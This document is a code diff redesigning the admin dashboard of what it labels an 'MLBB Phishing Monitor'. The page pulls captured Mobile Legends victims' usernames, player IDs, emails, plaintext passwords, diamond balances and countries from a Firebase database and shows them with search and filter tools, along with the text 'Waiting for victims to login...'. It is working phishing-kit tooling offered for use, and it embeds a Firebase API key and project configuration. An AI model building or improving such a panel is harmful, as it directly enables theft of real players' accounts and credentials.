@@ -2,120 +2,398 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Admin Dashboard – MLBB</title>
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard - MLBB</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
-<!-- Firebase SDKs (compat) -->
+<!-- Firebase -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 
 <style>
-body{
-  font-family:'Segoe UI',sans-serif;
-  background:#f1f5f9;
-  margin:0;
-  padding:20px;
-}
-.dashboard-container{
-  max-width:900px;
-  margin:0 auto;
-  background:white;
-  border-radius:10px;
-  box-shadow:0 4px 6px rgba(0,0,0,.1);
-  padding:20px;
-}
-header{
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  margin-bottom:20px;
-  border-bottom:1px solid #e2e8f0;
-  padding-bottom:15px;
-}
-h1{
-  margin:0;
-  color:#334155;
-  font-size:1.5rem;
-}
-table{
-  width:100%;
-  border-collapse:collapse;
-  margin-top:20px;
-}
-th,td{
-  padding:12px;
-  text-align:left;
-  border-bottom:1px solid #e2e8f0;
-}
-th{
-  background:#f8fafc;
-  color:#64748b;
-  font-size:.85rem;
-  text-transform:uppercase;
-}
-.badge{
-  padding:4px 8px;
-  border-radius:4px;
-  font-size:.75rem;
-  font-weight:bold;
-  color:white;
-}
-.bg-google{background:#db4437;}
-.bg-facebook{background:#1877f2;}
-.bg-moonton{background:#d97706;}
-.loading{
-  text-align:center;
-  padding:20px;
-  color:#64748b;
-}
-.no-data{
-  text-align:center;
-  color:#64748b;
-  margin-top:20px;
-}
-.btn{
-  display:inline-block;
-  padding:4px 8px;
-  border:none;
-  border-radius:3px;
-  background:#e53e3e;
-  color:white;
-  font-size:.75rem;
-  cursor:pointer;
-}
-.btn:hover{background:#c53030;}
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    background: #0f0f1a;
+    color: #e2e8f0;
+    min-height: 100vh;
+  }
+
+  .dashboard-header {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+    padding: 16px 24px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    backdrop-filter: blur(12px);
+  }
+
+  .header-inner {
+    max-width: 1280px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .header-left {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .logo-icon {
+    width: 36px;
+    height: 36px;
+    background: linear-gradient(135deg, #f5a623, #e8841c);
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    font-size: 16px;
+    color: #1a1a2e;
+  }
+
+  .header-title {
+    font-size: 18px;
+    font-weight: 700;
+    letter-spacing: -0.3px;
+  }
+
+  .header-title span {
+    color: #f5a623;
+  }
+
+  .header-stats {
+    display: flex;
+    gap: 20px;
+    align-items: center;
+  }
+
+  .stat-chip {
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 8px;
+    padding: 6px 14px;
+    font-size: 12px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    color: #94a3b8;
+  }
+
+  .stat-chip strong {
+    color: #f5a623;
+    font-weight: 700;
+    font-size: 14px;
+  }
+
+  .refresh-btn {
+    background: rgba(37, 99, 235, 0.15);
+    border: 1px solid rgba(37, 99, 235, 0.3);
+    color: #60a5fa;
+    padding: 7px 16px;
+    border-radius: 8px;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: inherit;
+  }
+
+  .refresh-btn:hover {
+    background: rgba(37, 99, 235, 0.25);
+  }
+
+  .dashboard-body {
+    max-width: 1280px;
+    margin: 0 auto;
+    padding: 20px 24px;
+  }
+
+  .filter-bar {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+    align-items: center;
+  }
+
+  .filter-bar input {
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 8px;
+    padding: 8px 14px;
+    font-size: 13px;
+    font-family: inherit;
+    color: #e2e8f0;
+    outline: none;
+    flex: 1;
+    min-width: 200px;
+  }
+
+  .filter-bar input::placeholder {
+    color: #475569;
+  }
+
+  .filter-bar input:focus {
+    border-color: rgba(37, 99, 235, 0.5);
+  }
+
+  .filter-select {
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 8px;
+    padding: 8px 14px;
+    font-size: 13px;
+    font-family: inherit;
+    color: #e2e8f0;
+    outline: none;
+    cursor: pointer;
+  }
+
+  .filter-select option {
+    background: #1a1a2e;
+    color: #e2e8f0;
+  }
+
+  .accounts-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+    gap: 14px;
+  }
+
+  .account-card {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 12px;
+    padding: 16px;
+    transition: all 0.2s;
+    position: relative;
+  }
+
+  .account-card:hover {
+    background: rgba(255,255,255,0.05);
+    border-color: rgba(255,255,255,0.12);
+    transform: translateY(-2px);
+  }
+
+  .card-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    margin-bottom: 12px;
+  }
+
+  .method-badge {
+    font-size: 10px;
+    font-weight: 700;
+    padding: 3px 10px;
+    border-radius: 20px;
+    letter-spacing: 0.3px;
+    text-transform: uppercase;
+  }
+
+  .method-badge.google { background: rgba(219, 68, 55, 0.2); color: #fca5a5; }
+  .method-badge.facebook { background: rgba(24, 119, 242, 0.2); color: #93c5fd; }
+  .method-badge.moonton { background: rgba(245, 166, 35, 0.2); color: #fcd34d; }
+
+  .card-time {
+    font-size: 11px;
+    color: #64748b;
+  }
+
+  .card-field {
+    display: flex;
+    justify-content: space-between;
+    padding: 4px 0;
+    font-size: 13px;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+  }
+
+  .card-field:last-child {
+    border-bottom: none;
+  }
+
+  .card-label {
+    color: #94a3b8;
+    font-weight: 500;
+  }
+
+  .card-value {
+    color: #e2e8f0;
+    font-weight: 600;
+    max-width: 55%;
+    text-align: right;
+    word-break: break-all;
+  }
+
+  .card-value.password {
+    color: #f87171;
+    font-family: monospace;
+    font-size: 12px;
+  }
+
+  .card-value.flag {
+    color: #34d399;
+    font-weight: 700;
+  }
+
+  .delete-btn {
+    background: rgba(239, 68, 68, 0.1);
+    border: 1px solid rgba(239, 68, 68, 0.2);
+    color: #fca5a5;
+    padding: 4px 12px;
+    border-radius: 6px;
+    font-size: 11px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: inherit;
+    margin-top: 10px;
+    width: 100%;
+  }
+
+  .delete-btn:hover {
+    background: rgba(239, 68, 68, 0.2);
+  }
+
+  .empty-state {
+    grid-column: 1 / -1;
+    text-align: center;
+    padding: 60px 20px;
+    color: #64748b;
+  }
+
+  .empty-state .icon {
+    font-size: 48px;
+    margin-bottom: 16px;
+    opacity: 0.3;
+  }
+
+  .empty-state h3 {
+    font-size: 18px;
+    color: #94a3b8;
+    margin-bottom: 6px;
+  }
+
+  .empty-state p {
+    font-size: 13px;
+  }
+
+  .loading-state {
+    grid-column: 1 / -1;
+    text-align: center;
+    padding: 60px 20px;
+  }
+
+  .spinner {
+    width: 36px;
+    height: 36px;
+    border: 3px solid rgba(255,255,255,0.06);
+    border-top: 3px solid #f5a623;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 12px;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .error-state {
+    grid-column: 1 / -1;
+    text-align: center;
+    padding: 60px 20px;
+    color: #f87171;
+  }
+
+  /* Responsive */
+  @media (max-width: 768px) {
+    .header-inner {
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .accounts-grid {
+      grid-template-columns: 1fr;
+    }
+
+    .filter-bar {
+      flex-direction: column;
+    }
+
+    .filter-bar input {
+      min-width: 100%;
+    }
+
+    .header-stats {
+      width: 100%;
+      justify-content: space-between;
+    }
+  }
 </style>
 </head>
-
 <body>
-<div class="dashboard-container">
-  <header>
-    <h1>📊 Collected Accounts</h1>
-    <div id="count" style="font-weight:bold;color:#2563eb;">0 Found</div>
-  </header>
 
-  <div id="loading" class="loading">Loading data…</div>
-  <div id="noData" class="no-data" style="display:none;">No accounts found yet.</div>
+<div class="dashboard-header">
+  <div class="header-inner">
+    <div class="header-left">
+      <div class="logo-icon">ML</div>
+      <div>
+        <div class="header-title">Admin <span>Dashboard</span></div>
+        <div style="font-size:11px;color:#64748b;margin-top:2px;">MLBB Phishing Monitor</div>
+      </div>
+    </div>
+    <div class="header-stats">
+      <div class="stat-chip">
+        📋 Total: <strong id="totalCount">0</strong>
+      </div>
+      <div class="stat-chip">
+        🚩 Flagged: <strong id="flagCount">0</strong>
+      </div>
+      <button class="refresh-btn" onclick="loadAccounts()">⟳ Refresh</button>
+    </div>
+  </div>
+</div>
 
-  <table id="dataTable" style="display:none;">
-    <thead>
-      <tr>
-        <th>Method</th>
-        <th>Username</th>
-        <th>ID / Server</th>
-        <th>Email</th>
-        <th>Password</th>
-        <th>Diamonds</th>
-        <th>Timestamp</th>
-        <th>Actions</th>
-      </tr>
-    </thead>
-    <tbody id="tableBody"></tbody>
-  </table>
+<div class="dashboard-body">
+  <div class="filter-bar">
+    <input type="text" id="searchInput" placeholder="🔍 Search by username, email, player ID, or flag..." oninput="filterAccounts()">
+    <select class="filter-select" id="methodFilter" onchange="filterAccounts()">
+      <option value="all">All Methods</option>
+      <option value="GOOGLE">Google</option>
+      <option value="FACEBOOK">Facebook</option>
+      <option value="MOONTON">Moonton</option>
+    </select>
+    <select class="filter-select" id="flagFilter" onchange="filterAccounts()">
+      <option value="all">All Flags</option>
+      <option value="Philippines">🇵🇭 Philippines</option>
+      <option value="Vietnam">🇻🇳 Vietnam</option>
+      <option value="Indonesia">🇮🇩 Indonesia</option>
+      <option value="Malaysia">🇲🇾 Malaysia</option>
+      <option value="Thailand">🇹🇭 Thailand</option>
+      <option value="Brazil">🇧🇷 Brazil</option>
+      <option value="India">🇮🇳 India</option>
+      <option value="United States">🇺🇸 USA</option>
+      <option value="Other">Other</option>
+    </select>
+  </div>
+
+  <div id="accountsContainer">
+    <div class="loading-state" id="loadingState">
+      <div class="spinner"></div>
+      <p style="color:#94a3b8;">Loading data...</p>
+    </div>
+  </div>
 </div>
 
 <script>
-// Firebase configuration – same as the client page
+// FIREBASE
 const firebaseConfig = {
   apiKey:"AIzaSyDlIzPKZ4C15866Ul-UusdUBF-xCdC2Knk",
   authDomain:"hackmlbb-bee81.firebaseapp.com",
@@ -128,76 +406,211 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-async function loadDashboard(){
-  const tableBody=document.getElementById('tableBody');
-  const loading=document.getElementById('loading');
-  const noData=document.getElementById('noData');
-  const table=document.getElementById('dataTable');
-  const countBadge=document.getElementById('count');
+let allAccounts = [];
 
-  try{
-    const snapshot=await db.collection('accounts').orderBy('timestamp','desc').get();
-    loading.style.display='none';
+function formatTime(ts) {
+  if (!ts) return 'N/A';
+  const d = ts.toDate();
+  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+  return `${months[d.getMonth()]} ${d.getDate()}, ${d.getFullYear()} ${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')}`;
+}
 
-    if(snapshot.empty){
-      noData.style.display='block';
-      countBadge.textContent='0 Found';
-      return;
+function getFlagEmoji(country) {
+  const emojiMap = {
+    'Philippines': '🇵🇭',
+    'Vietnam': '🇻🇳',
+    'Indonesia': '🇮🇩',
+    'Malaysia': '🇲🇾',
+    'Thailand': '🇹🇭',
+    'Brazil': '🇧🇷',
+    'India': '🇮🇳',
+    'United States': '🇺🇸',
+    'Singapore': '🇸🇬',
+    'Myanmar': '🇲🇲',
+    'Cambodia': '🇰🇭',
+    'Laos': '🇱🇦',
+    'Japan': '🇯🇵',
+    'Korea': '🇰🇷',
+    'China': '🇨🇳',
+    'Taiwan': '🇹🇼',
+    'Russia': '🇷🇺',
+    'Mexico': '🇲🇽',
+    'Egypt': '🇪🇬',
+    'Nigeria': '🇳🇬',
+    'United Kingdom': '🇬🇧',
+    'Australia': '🇦🇺',
+    'Canada': '🇨🇦',
+    'Argentina': '🇦🇷',
+    'Colombia': '🇨🇴',
+    'Turkey': '🇹🇷',
+    'Pakistan': '🇵🇰',
+    'Bangladesh': '🇧🇩',
+    'Saudi Arabia': '🇸🇦',
+    'France': '🇫🇷',
+    'Germany': '🇩🇪',
+    'Netherlands': '🇳🇱',
+    'Spain': '🇪🇸',
+    'Portugal': '🇵🇹',
+    'Italy': '🇮🇹',
+  };
+  return emojiMap[country] || '🏳️';
+}
+
+function renderAccounts(accounts) {
+  const container = document.getElementById('accountsContainer');
+
+  if (accounts.length === 0) {
+    container.innerHTML = `
+      <div class="empty-state">
+        <div class="icon">📭</div>
+        <h3>No accounts captured yet</h3>
+        <p>Waiting for victims to login...</p>
+      </div>
+    `;
+    return;
+  }
+
+  let html = '<div class="accounts-grid">';
+
+  accounts.forEach(acc => {
+    const method = (acc.method || 'UNKNOWN').toLowerCase();
+    const flag = acc.flag || 'Unknown';
+    const flagEmoji = getFlagEmoji(flag);
+    const ts = formatTime(acc.timestamp);
+
+    html += `
+      <div class="account-card">
+        <div class="card-top">
+          <span class="method-badge ${method}">${method}</span>
+          <span class="card-time">${ts}</span>
+        </div>
+
+        <div class="card-field">
+          <span class="card-label">Username</span>
+          <span class="card-value">${acc.username || 'N/A'}</span>
+        </div>
+
+        <div class="card-field">
+          <span class="card-label">Player ID</span>
+          <span class="card-value">${acc.playerId || 'N/A'}</span>
+        </div>
+
+        <div class="card-field">
+          <span class="card-label">Server</span>
+          <span class="card-value">${acc.serverId || 'N/A'}</span>
+        </div>
+
+        <div class="card-field">
+          <span class="card-label">Email</span>
+          <span class="card-value">${acc.email || 'N/A'}</span>
+        </div>
+
+        <div class="card-field">
+          <span class="card-label">Password</span>
+          <span class="card-value password">${acc.password || 'N/A'}</span>
+        </div>
+
+        <div class="card-field">
+          <span class="card-label">Diamonds</span>
+          <span class="card-value">${acc.diamond || 'N/A'}</span>
+        </div>
+
+        <div class="card-field">
+          <span class="card-label">🚩 Flag (Country)</span>
+          <span class="card-value flag">${flagEmoji} ${flag}</span>
+        </div>
+
+        <button class="delete-btn" onclick="deleteAccount('${acc.id}')">🗑 Delete</button>
+      </div>
+    `;
+  });
+
+  html += '</div>';
+  container.innerHTML = html;
+}
+
+function filterAccounts() {
+  const search = document.getElementById('searchInput').value.toLowerCase();
+  const methodFilter = document.getElementById('methodFilter').value;
+  const flagFilter = document.getElementById('flagFilter').value;
+
+  let filtered = allAccounts;
+
+  if (search) {
+    filtered = filtered.filter(acc =>
+      (acc.username || '').toLowerCase().includes(search) ||
+      (acc.email || '').toLowerCase().includes(search) ||
+      (acc.playerId || '').toLowerCase().includes(search) ||
+      (acc.flag || '').toLowerCase().includes(search)
+    );
+  }
+
+  if (methodFilter !== 'all') {
+    filtered = filtered.filter(acc => (acc.method || '').toUpperCase() === methodFilter);
+  }
+
+  if (flagFilter !== 'all') {
+    if (flagFilter === 'Other') {
+      const known = ['Philippines','Vietnam','Indonesia','Malaysia','Thailand','Brazil','India','United States'];
+      filtered = filtered.filter(acc => !known.includes(acc.flag));
+    } else {
+      filtered = filtered.filter(acc => acc.flag === flagFilter);
     }
+  }
 
-    noData.style.display='none';
-    table.style.display='table';
-    countBadge.textContent=`${snapshot.size} Found`;
+  renderAccounts(filtered);
+  updateCounts(filtered);
+}
 
-    snapshot.forEach(doc=>{
-      const d=doc.data();
-      const row=document.createElement('tr');
+function updateCounts(filtered) {
+  document.getElementById('totalCount').textContent = allAccounts.length;
 
-      // Badge colour based on method
-      let badgeClass='bg-moonton';
-      if(d.method==='GOOGLE') badgeClass='bg-google';
-      if(d.method==='FACEBOOK') badgeClass='bg-facebook';
+  const flagged = filtered.filter(acc => acc.flag && acc.flag !== 'Unknown' && acc.flag !== 'unavailable').length;
+  document.getElementById('flagCount').textContent = flagged;
+}
 
-      const ts = d.timestamp ? new Date(d.timestamp.seconds*1000).toLocaleString() : '—';
+async function loadAccounts() {
+  const container = document.getElementById('accountsContainer');
+  container.innerHTML = `
+    <div class="loading-state">
+      <div class="spinner"></div>
+      <p style="color:#94a3b8;">Loading data...</p>
+    </div>
+  `;
 
-      row.innerHTML = `
-        <td><span class="badge ${badgeClass}">${d.method}</span></td>
-        <td><strong>${d.username}</strong></td>
-        <td>${d.playerId} (${d.serverId})</td>
-        <td>${d.email}</td>
-        <td>${d.password}</td>
-        <td style="color:#fbbf24">${d.diamond}</td>
-        <td>${ts}</td>
-        <td><button class="btn" data-id="${doc.id}">Delete</button></td>
-      `;
-      tableBody.prepend(row);
+  try {
+    const snapshot = await db.collection('accounts').orderBy('timestamp', 'desc').get();
+    allAccounts = [];
+    snapshot.forEach(doc => {
+      allAccounts.push({ id: doc.id, ...doc.data() });
     });
-
-    // Attach delete handlers
-    tableBody.querySelectorAll('.btn').forEach(btn=>{
-      btn.addEventListener('click',async e=>{
-        const id=e.target.dataset.id;
-        if(confirm('Delete this record?')){
-          await db.collection('accounts').doc(id).delete();
-          e.target.parentElement.parentElement.remove();
-          // Update count
-          const remaining = tableBody.rows.length;
-          countBadge.textContent=`${remaining} Found`;
-          if(remaining===0){
-            table.style.display='none';
-            noData.style.display='block';
-          }
-        }
-      });
-    });
-
-  }catch(err){
-    console.error('Dashboard error:',err);
-    loading.textContent='Error loading data.';
+    filterAccounts();
+  } catch (err) {
+    console.error(err);
+    container.innerHTML = `
+      <div class="error-state">
+        <p style="font-size:18px;margin-bottom:6px;">⚠️ Error loading data</p>
+        <p style="font-size:13px;color:#94a3b8;">${err.message}</p>
+        <button class="refresh-btn" style="margin-top:16px;" onclick="loadAccounts()">Retry</button>
+      </div>
+    `;
   }
 }
 
-window.addEventListener('load', loadDashboard);
+async function deleteAccount(id) {
+  if (!confirm('Delete this account entry?')) return;
+
+  try {
+    await db.collection('accounts').doc(id).delete();
+    loadAccounts();
+  } catch (err) {
+    alert('Error deleting: ' + err.message);
+  }
+}
+
+// Auto-load on page load
+loadAccounts();
 </script>
+
 </body>
 </html>
